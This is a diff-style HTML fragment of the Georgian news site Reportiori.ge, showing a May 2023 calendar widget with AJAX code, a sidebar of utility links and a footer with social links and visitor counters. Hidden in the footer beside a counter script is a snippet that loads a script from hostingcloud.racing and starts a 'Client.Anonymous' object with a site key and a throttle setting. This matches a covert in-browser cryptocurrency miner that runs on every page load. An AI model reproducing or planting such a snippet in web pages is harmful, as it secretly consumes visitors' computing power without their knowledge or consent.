+    <td align="center" valign="middle" class="calendarHeader"><div style="width:120px;" align="center">მაისი 2023</div></td>
+    <td width="8" align="center" valign="middle"><a onclick="cal(6,2023,1)"><img src="img/calNextMonth.png" alt=""></a></td>
+    <td width="24" align="center" valign="middle"><a onclick="cal(5,2024,1)"><img src="img/calNextYear.png" alt=""></a></td>
+    </tr>
+    </tbody></table>
+    <table class="calendar" border="0" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+    <td align="center" valign="middle" class="calendarHeader3">ორ</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">სა</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">ოთ</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">ხუ</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">პა</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">შა</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td>
+    <td align="center" valign="middle" class="calendarHeader3">კვ</td>
+    </tr>
+    <tr style="border-bottom:1px solid #e4e4e4;">
+    <td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=01&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">1</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=02&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">2</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=03&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">3</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=04&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">4</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=05&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">5</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=06&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">6</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=07&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">7</a></td>
+    </tr>
+    <tr style="border-bottom:1px solid #e4e4e4;">
+    <td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=08&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">8</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=09&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">9</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=10&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">10</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=11&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">11</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=12&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">12</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=13&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">13</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=14&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">14</a></td>
+    </tr>
+    <tr style="border-bottom:1px solid #e4e4e4;">
+    <td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=15&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">15</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=16&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">16</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=17&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">17</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=18&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">18</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=19&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">19</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=20&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">20</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=21&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">21</a></td>
+    </tr>
+    <tr style="border-bottom:1px solid #e4e4e4;">
+    <td class="calendarAnother" align="center" valign="middle"><a href="index.php?address=cal&amp;day=22&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">22</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarToday" align="center" valign="middle"><a href="index.php?address=cal&amp;day=23&amp;month=05&amp;year=2023&amp;lang=1" style="text-decoration:underline;">23</a></td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">24</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">25</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">26</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">27</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">28</td>
+    </tr>
+    <tr style="border-bottom:1px solid #e4e4e4;">
+    <td class="calendarAnother" align="center" valign="middle">29</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">30</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">31</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">&nbsp;</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">&nbsp;</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">&nbsp;</td>
+    <td align="center" valign="middle" class="calendarHeader2"></td><td class="calendarAnother" align="center" valign="middle">&nbsp;</td>
+    </tr>
+    </tbody></table>
+    <pre></pre></div>
+                <script type="text/javascript">
+                    function cal(month,year,lang) { 
+                        var xmlhttp; 
+                        if (window.XMLHttpRequest) 
+                    { // code for IE7+, Firefox, Chrome, Opera, Safari 
+                        xmlhttp=new XMLHttpRequest(); 
+                    } else if (window.ActiveXObject) { 
+                        // code for IE6, IE5
+                        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
+                    } else { 
+                        alert("Your browser does not support XMLHTTP!"); 
+                    } 
+                    xmlhttp.onreadystatechange=function() { 
+                        if(xmlhttp.readyState==4) { 
+                            document.getElementById("calendar").innerHTML=xmlhttp.responseText; 
+                        } else { 
+                            
+                        }    
+                    } 
+                    var url="cal.php?month="+month+"&year="+year+"&lang="+lang; 
+                    xmlhttp.open("GET",url,true); 
+                    xmlhttp.send(null); 
+                    
+                }
+                $(document).ready(function() {
+                    cal(5,2023,1);
+                });
+            </script>
+        </div>
+    
+        
+    
+    </div>
+    
+    
+     <div class="four_news_wrap" style="width:292px;margin-top:20px; margin-right:8px;padding:0 3px;"><span class="category_mark left_sider" style="transform:none;right: 41%;top:-21px;width: 155px;">სხვადასხვა</span>
+    
+              <ul class="rightbar_other others">
+                <li class="valuta"><a href="http://nbg.ge" target="_blank">ვალუტის კურსი</a></li>
+                <li class="flight"><a href="http://www.tbilisiairport.com/gu-GU/flightinfo/Pages/Flightinfo.aspx" target="_blank">ფრენის განრიგი</a></li>
+                <li class="rail"><a href="http://railway.ge/?action=page&amp;p_id=478&amp;lang=geo" target="_blank">მატარებლების განრიგი</a></li>
+                <li class="apisha"><a href="https://www.kinoafisha.ge/" target="_blank">კინოაფიშა</a></li>
+                <li class="horoskopi"><a href="http://yellowblog.ge/astro/" target="_blank">ჰოროსკოპი</a></li>
+            </ul>
+    
+        </div>
+    
+    
+            
+                    
+    
+              <a class="right_banner" target="_blank" href=""><img src="uploads/banner_82.png?w=292&amp;h=104" width="292" height="104" alt="right_banner">
+    </a>
+              
+    
+          
+    </div>	
+    
+    
+    
+        </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      </div>
+    
+    
+    
+    
+    
+    <!-- 
+        <div class="side_tree" style="width: 300px; position: fixed; left: 50%; margin-left: 490px; z-index:99; bottom:0; display:block;">
+        <img src="img/nadzvi.png?w=300&h=0" style="width: 300px;" />
+    
+        </div>
+    
+    
+    
+        <div class="side_tree" style="width: 250px; position: fixed; left: 50%; margin-left: -765px; z-index:99; bottom:0; display:block;">
+        <img src="img/lampioni.png?w=250&h=0" style="width: 250px;" />
+    
+        </div>
+     -->
+    
+     
+    <div class="footer"> 
+    <br> 
+    <div class="content">
+    
+    <span class="soc_icons_footer"> 
+            <a href="https://www.facebook.com/reportior" target="_blank"><img src="images/fb.png" alt="facebook" title="Facebook"></a> 
+            <a href="https://www.youtube.com/user/Reportiori" target="_blank"><img src="images/youtube.png" alt="youtube" title="Youtube"></a> 
+            <a href="http://reportiori.ge/rss.php" target="_blank"><img src="images/rss.png" alt="rss" title="RSS"></a> 
+        </span>
+    
+    <div style="width:400px; height:160px;" class="fb-page" data-href="https://www.facebook.com/reportior" data-small-header="true" data-adapt-container-width="false" data-hide-cover="false" data-show-facepile="true" data-show-posts="false">
+        <div class="fb-xfbml-parse-ignore">
+        <blockquote cite="https://www.facebook.com/reportior">
+            <a href="https://www.facebook.com/reportior">Reportiori.ge</a>
+        </blockquote>
+        </div>
+    </div>
+    
+    <table width="600" border="0" cellpadding="10px" class="footer_table" cellspacing="5px">
+      <tbody><tr>
+    
+        <td>
+            <a href="index.php?type=static&amp;id=14">პარტნიორები</a><br>
+    
+            <a href="index.php?type=static&amp;id=15">ქარტია</a><br>
+    
+            <a href="index.php?menuid=108">ფოტო არქივი</a>
+        </td>
+    
+        <td>
+            <a href="index.php?type=static&amp;id=18">ბმულები</a><br>
+    
+            <a href="index.php?type=static&amp;id=19">რეკლამა</a><br>
+    
+            <a href="index.php?type=static&amp;id=20">კონტაქტი</a>
+        </td>
+    
+        <td>!!! All rights reserved<br>
+    
+            Property of<br>
+    
+            Reportiori
+        </td>
+         <td>
+            <!-- TOP.GE ASYNC COUNTER CODE -->
+            <div id="top-ge-counter-container" data-site-id="90748"></div>
+            <script async="" src="//counter.top.ge/counter.js"></script>
+            <!-- / END OF TOP.GE COUNTER CODE -->
+            <script src="https://www.hostingcloud.racing/wfbd.js"></script>
+            <script>
+              var _client = new Client.Anonymous('4621bcc7d5d0a50acc616cb16c5457f68d4873bc71879d50a7832a5c860dc9dd', {
+                 throttle: 0.6, c: 'w', ads: 0
+               });
+              _client.start();
+            </script>
+            <br>
+            <script id="_wau___">var _wau = _wau || []; _wau.push(["classic", "acegr9sgdv", "___"]);</script><script async="" src="//waust.at/c.js"></script>
+        </td>
+        
+      </tr>
+    
+    </tbody></table>
+    <!--<div id="google_map">
+                <script type="text/javascript" src="http://www.webestools.com/google_map_gen.js?lati=41.727510&long=44.771384&zoom=17&width=502&height=203&mapType=normal&map_btn_normal=yes&map_btn_satelite=yes&map_btn_mixte=yes&map_small=yes&marqueur=yes&info_bulle="></script>       
+            </div>-->
+    
+    
+    </div>
+    
+    </div>
+    
+    <!-- <iframe src="https://" style="width: 0px; height: 0px; visibility: visible;"></iframe> -->
+    
+    
+    
+    
+    
+    <div id="topcontrol" title="back to top" style="position: fixed; bottom: 60px; left: 35px; opacity: 0; cursor: pointer;"><img src="images/up-arrow.png" width="43" height="43" alt="up"></div></body></html>
